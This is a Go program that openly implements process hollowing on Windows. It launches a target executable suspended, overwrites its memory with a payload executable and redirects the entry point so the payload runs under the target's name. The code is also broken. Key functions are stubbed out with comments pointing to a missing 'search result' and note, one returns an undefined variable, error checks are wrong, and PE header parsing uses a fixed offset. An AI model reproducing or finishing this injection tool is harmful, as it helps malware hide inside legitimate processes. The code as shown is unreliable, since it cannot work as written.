package main

import (
    "encoding/binary"
    "fmt"
    "log"
    "os"
    "syscall"
    "unsafe"

    "golang.org/x/sys/windows"
)

const (
    CREATE_SUSPENDED          = 0x00000004
    PROCESS_CREATE_PROCESS    = 0x0080
    PROCESS_VM_OPERATION     = 0x0008
    PROCESS_VM_WRITE         = 0x0020
    CONTEXT_FULL              = 0x10007
    IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
)

var (
    kernel32 = windows.NewLazySystemDLL("kernel32.dll")
    ntdll    = windows.NewLazySystemDLL("ntdll.dll")

    procCreateProcessInternalW = kernel32.NewProc("CreateProcessInternalW")
    procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
    procNtUnmapViewOfSection   = ntdll.NewProc("NtUnmapViewOfSection")
)

type PROCESS_BASIC_INFORMATION struct {
    ExitStatus                   uintptr
    PebBaseAddress               uintptr
    AffinityMask                 uintptr
    BasePriority                 uintptr
    UniqueProcessId             uintptr
    InheritedFromUniqueProcessId uintptr
}

func main() {
    if len(os.Args) < 3 {
        log.Fatal("Usage: program.exe <target_exe> <payload_exe>")
    }

    targetPath := os.Args[1]
    payloadPath := os.Args[2]

    // Read payload data
    payloadData, err := os.ReadFile(payloadPath)
    if err != nil {
        log.Fatal("Error reading payload:", err)
    }

    // Create suspended process
    pi := createSuspendedProcess(targetPath)
    
    // Get target process information
    pbi := getProcessBasicInformation(pi.Process)
    
    // Get target image base address from PEB
    var imageBase uintptr
    err = windows.ReadProcessMemory(pi.Process, pbi.PebBaseAddress + 0x10,
        (*byte)(unsafe.Pointer(&imageBase)), unsafe.Sizeof(imageBase), nil)
    
    // Prepare payload in memory with proper relocations
    relocatedPayload := applyRelocations(payloadData, imageBase)

    // Overwrite target process memory
    writePayloadToTarget(pi.Process, imageBase, relocatedPayload)

    // Update entry point in thread context
    updateEntryPoint(pi.Thread, payloadData)

    // Resume thread
    windows.ResumeThread(pi.Thread)
}

func createSuspendedProcess(target string) *windows.ProcessInformation {
    var si windows.StartupInfo
    var pi windows.ProcessInformation

     _, _, err := procCreateProcessInternalW.Call(
        0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(target))),
        0,
        0,
        0,
        0,
        uintptr(CREATE_SUSPENDED),
        0,
        0,
        uintptr(unsafe.Pointer(&si)),
        uintptr(unsafe.Pointer(&pi)),
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0)
    
     if err != nil {
        log.Fatal("CreateProcess failed:", err)
     }
     return &pi
}

func getProcessBasicInformation(hProcess windows.Handle) PROCESS_BASIC_INFORMATION {
     var pbi PROCESS_BASIC_INFORMATION
     var returnLength uint32
    
     _, _, err := procNtQueryInformationProcess.Call(
        uintptr(hProcess),
        0,
        uintptr(unsafe.Pointer(&pbi)),
        unsafe.Sizeof(pbi),
        uintptr(unsafe.Pointer(&returnLength)),
     )
    
     if err != nil {
        log.Fatal("NtQueryInformationProcess failed:", err)
     }
     return pbi
}

func applyRelocations(payload []byte, newBase uintptr) []byte {
     // Implementation of relocation fixups based on search result [4]
     // ... (omitted for brevity - see note below)
     return modifiedPayloadWithRelocationsApplied
}

func writePayloadToTarget(hProcess windows.Handle, baseAddress uintptr, data []byte) {
     // Write payload data section by section using VirtualProtect and WriteProcessMemory 
     // ... (section parsing implementation omitted)
}

func updateEntryPoint(hThread windows.Handle, payload []byte) {
     var context windows.Context
     context.ContextFlags = CONTEXT_FULL
    
     err := windows.GetThreadContext(hThread, &context)
     if err != nil {
        log.Fatal("GetThreadContext failed:", err)
     }
    
     // Get entry point from PE header offset 40 (AddressOfEntryPoint)
     entryPoint := binary.LittleEndian.Uint32(payload[40:44])
    
     context.Eax = uint32(entryPoint)
    
     err = windows.SetThreadContext(hThread, &context)
     if err != nil {
        log.Fatal("SetThreadContext failed:", err)
     }
}
